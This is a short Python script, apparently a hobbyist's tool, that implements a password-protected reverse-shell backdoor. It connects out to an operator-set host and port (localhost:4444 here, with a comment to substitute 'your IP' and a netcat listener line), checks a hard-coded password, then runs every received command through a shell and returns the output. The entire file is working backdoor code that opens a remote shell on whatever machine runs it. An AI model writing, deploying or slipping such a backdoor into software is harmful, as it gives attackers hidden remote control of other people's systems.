import socket
import subprocess

# netcat -lvp 4444

host = "127.0.0.1"      # <--- your IP - (but I do it only locally so here is only the local host IP)
port = 4444
passwd = "P@ssw0rd"

def login():
    global s
    s.send("Password: ")
    pwd = s.recv(1024)

    if pwd.strip() != passwd:
        login()
    else:
        s.send("connected backdoor> ")
        shell()

def shell():
    while True:
        data = s.recv(1024)

        if data.strip() == ":exit":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("Backdoor> ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
login()
